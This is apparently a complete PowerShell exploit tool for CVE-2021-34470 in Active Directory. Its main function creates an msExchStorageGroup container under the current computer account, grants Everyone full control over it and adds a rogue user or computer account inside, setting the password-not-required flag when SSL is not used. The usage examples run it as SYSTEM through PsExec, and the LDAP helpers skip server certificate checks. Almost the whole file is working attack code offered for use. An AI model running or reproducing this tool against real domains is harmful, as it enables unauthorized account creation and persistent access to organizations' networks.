Function New-RogueAccount {
<#
.SYNOPSIS
    Create a new account (user or computer) in Active Directory by exploiting CVE-2021-34470.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-RogueAccount creates a msExchStorageGroup object under the current computer account, and creates a further user or computer object under it.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the computer account to use.

.PARAMETER Class
    Specifies the account class to create, defaults to 'user'.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> PsExec.exe -i -s powershell.exe
    PS C:\> New-RogueAccount -Class computer -SamAccountName 'testmachine$' -Password P@ssw0rd

.EXAMPLE
    PS C:\> New-RogueAccount -Server ADATUM.CORP -Credential 'ADATUM\testmachine$' -SamAccountName testuser -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [string]
        $Server = (Get-WMIObject Win32_ComputerSystem | Select -ExpandProperty Domain),

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('user', 'computer')]
        [String]
        $Class = 'user',

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [string]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Password
    )

    Begin {
        $currentId = (Get-LdapCurrentUser -Server $Server -SSL:$SSL -Credential $Credential).UserName
        $computer = Get-LdapObject -Server $Server -SSL:$SSL -Credential $Credential -Filter "(sAMAccountName=$currentId)" -Properties 'DistinguishedName'
    }

    Process {
        $sd = [DirectoryServices.ActiveDirectorySecurity]::new()
        $sd.SetSecurityDescriptorSddlForm("D:P(A;CI;GA;;;WD)", "Access")
        $ba = $sd.GetSecurityDescriptorBinaryForm()
        $containerClass = 'msExchStorageGroup'
        $containerRDN = "cn=$(-join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_}))"
        $distinguishedName = "$containerRDN,$($computer.DistinguishedName)"
        $properties = @{nTSecurityDescriptor=$ba}
        $newContainer = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class $containerClass -Properties $properties -Credential $Credential
        Write-Host "[+] Container created: $newContainer"

        $objectRDN = "cn=$SamAccountName".TrimEnd('$')
        $distinguishedName = "$objectRDN,$newContainer"
        switch ($Class) {
            user {
                if ($SSL) {
                    # NORMAL_ACCOUNT
                    $userAccountControl = '512'
                }
                else {
                    # NORMAL_ACCOUNT + PASSWD_NOTREQD
                    $userAccountControl = '544'
                }
            }
            computer {
                if ($SSL) {
                    # WORKSTATION_TRUST_ACCOUNT
                    $userAccountControl = '4096'
                }
                else {
                    # WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD
                    $userAccountControl = '4128'
                }
            }
        }
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
        $properties = @{sAMAccountName=$SamAccountName; userAccountControl=$userAccountControl; unicodePwd=$passwordBytes}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class $Class -Properties $properties -Credential $Credential
        Write-Host "[+] $Class created: $newObject"
    }
}

Function Local:Get-LdapCurrentUser {
    [CmdletBinding()]
    Param (
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    try {
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        if ($SSL) {
            $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $searcher.SessionOptions.SecureSocketLayer = $true
            $searcher.SessionOptions.VerifyServerCertificate = {$true}
        }
        else {
            $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList $Server
        }
        if ($Credential.UserName) {
            $searcher.Credential = $Credential
        }

        # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
        $extRequest = New-Object DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
        $resp = [Text.Encoding]::ASCII.GetString($searcher.SendRequest($extRequest).ResponseValue)
        [pscustomobject] @{
            "NetbiosName"   = $($resp.split('\')[0].split(':')[-1])
            "UserName"      = $($resp.split('\')[1])
        }
    }
    catch {
        Write-Error $_
    }
}

Function Local:Get-LdapRootDSE {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL
    )

    $searchString = "LDAP://$Server/RootDSE"
    if ($SSL) {
        # Note that the server certificate has to be trusted
        $authType = [DirectoryServices.AuthenticationTypes]::SecureSocketsLayer
    }
    else {
        $authType = [DirectoryServices.AuthenticationTypes]::Anonymous
    }
    $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null, $authType)
    return $rootDSE
}

Function Local:Get-LdapObject {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        if ((-not $SearchBase) -or $SSL) {
            # Get default naming context
            try {
                $rootDSE = Get-LdapRootDSE -Server $Server
                $defaultNC = $rootDSE.defaultNamingContext[0]
            }
            catch {
                Write-Error "Domain controller unreachable"
                continue
            }
            if (-not $SearchBase) {
                $SearchBase = $defaultNC
            }
        }
    }

    Process {
        try {
            if ($SSL) {
                $results = @()
                $domain = $defaultNC -replace 'DC=' -replace ',','.'
                [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
                $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
                $searcher.SessionOptions.SecureSocketLayer = $true
                $searcher.SessionOptions.VerifyServerCertificate = {$true}
                $searcher.SessionOptions.DomainName = $domain
                $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
                if ($Credential.UserName) {
                    $searcher.Bind($Credential)
                }
                else {
                    $searcher.Bind()
                }
                if ($Properties -ne '*') {
                    $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope, $Properties)
                }
                else {
                    $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope)
                }
                $pageRequestControl = New-Object -TypeName System.DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
                $request.Controls.Add($pageRequestControl) | Out-Null
                $response = $searcher.SendRequest($request)
                while ($true) {
                    $response = $searcher.SendRequest($request)
                    if ($response.ResultCode -eq 'Success') {
                        foreach ($entry in $response.Entries) {
                            $results += $entry
                        }
                    }
                    $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl]$response.Controls[0]
                    if ($pageResponseControl.Cookie.Length -eq 0) {
                        break
                    }
                    $pageRequestControl.Cookie = $pageResponseControl.Cookie
                }
            }
            else {
                $adsPath = "LDAP://$Server/$SearchBase"
                if ($Credential.UserName) {
                    $domainObject = New-Object DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                    $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
                }
                else {
                    $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$adsPath)
                }
                $searcher.SearchScope = $SearchScope
                $searcher.PageSize = $PageSize
                $searcher.CacheResults = $false
                $searcher.filter = $Filter
                $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
                $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
                $results = $searcher.FindAll()
            }
        }
        catch {
            Write-Error $_
            continue
        }

        $results | Where-Object {$_} | ForEach-Object {
            if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
                # Convert DirectoryAttribute object (LDAPS results)
                $p = @{}
                foreach ($a in $_.Attributes.Keys | Sort-Object) {
                    if (($a -eq 'objectsid') -or ($a -eq 'sidhistory') -or ($a -eq 'objectguid') -or ($a -eq 'securityidentifier') -or ($a -eq 'msds-allowedtoactonbehalfofotheridentity') -or ($a -eq 'usercertificate') -or ($a -eq 'ntsecuritydescriptor') -or ($a -eq 'logonhours')) {
                        $p[$a] = $_.Attributes[$a]
                    }
                    elseif ($a -eq 'dnsrecord') {
                        $p[$a] = ($_.Attributes[$a].GetValues([byte[]]))[0]
                    }
                    elseif (($a -eq 'whencreated') -or ($a -eq 'whenchanged')) {
                        $value = ($_.Attributes[$a].GetValues([byte[]]))[0]
                        $format = "yyyyMMddHHmmss.fZ"
                        $p[$a] = [datetime]::ParseExact([Text.Encoding]::UTF8.GetString($value), $format, [cultureinfo]::InvariantCulture)
                    }
                    else {
                        $values = @()
                        foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
                            $values += [Text.Encoding]::UTF8.GetString($v)
                        }
                        $p[$a] = $values
                    }
                }
            }
            else {
                $p = $_.Properties
            }
            $objectProperties = @{}
            $p.Keys | ForEach-Object {
                if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                    $objectProperties[$_] = $p[$_][0]
                }
                elseif ($_ -ne 'adspath') {
                    $objectProperties[$_] = $p[$_]
                }
            }
            New-Object -TypeName PSObject -Property ($objectProperties)
        }
    }

    End {
        if ($results -and -not $SSL) {
            $results.dispose()
        }
        if ($searcher) {
            $searcher.dispose()
        }
    }
}

Function Local:New-LdapObject {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Class,

        [ValidateNotNullOrEmpty()]
        [hashtable]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $objectDN = $null

    if ($SSL) {
        try {
            # Get default naming context
            $rootDSE = Get-LdapRootDSE -Server $Server
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domain = $defaultNC -replace 'DC=' -replace ',','.'

            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }

            Write-Verbose "Attempting to create object $DistinguishedName..."
            $request = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
            $request.DistinguishedName = $DistinguishedName
            $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass", $Class)) | Out-Null
            if ($Properties) {
                foreach ($property in $Properties.GetEnumerator()) {
                    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList $property.Key, $property.Value)) | Out-Null
                }
            }

            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                $objectDN = $DistinguishedName
                Write-Verbose "Object created: $objectDN"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $RDN = $DistinguishedName.Split(',')[0]
            $searchBase = $DistinguishedName -replace "^$($RDN),"
            $adsPath = "LDAP://$Server/$searchBase"
            if ($Credential.UserName) {
                $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath)
            }

            Write-Verbose "Attempting to create object $DistinguishedName..."
            $newObject = $containerObject.Children.Add($RDN, $Class)
            $passwordBytes = $null
            if ($Properties) {
                foreach ($property in $Properties.GetEnumerator()) {
                    # unicodePwd can not be set in cleartext
                    if ($property.Key -ne 'unicodePwd') {
                        $newObject.Properties[$property.Key].Value = $property.Value
                    }
                    else {
                        $passwordBytes = $property.Value
                    }
                }
            }

            $newObject.CommitChanges()
            Write-Verbose "Object created: $($newObject.DistinguishedName)"

            if ($passwordBytes) {
                Write-Verbose "Attempting to set password..."
                $password = [Text.Encoding]::Unicode.GetString($passwordBytes).TrimStart('"').TrimEnd('"')
                $newObject.Invoke("SetPassword", $password)
                Write-Verbose "Password set!"
            }
            $newObject.CommitChanges()

            $objectDN = $newObject.DistinguishedName
        }
        catch {
            Write-Error $_
        }
    }

    return $objectDN
}
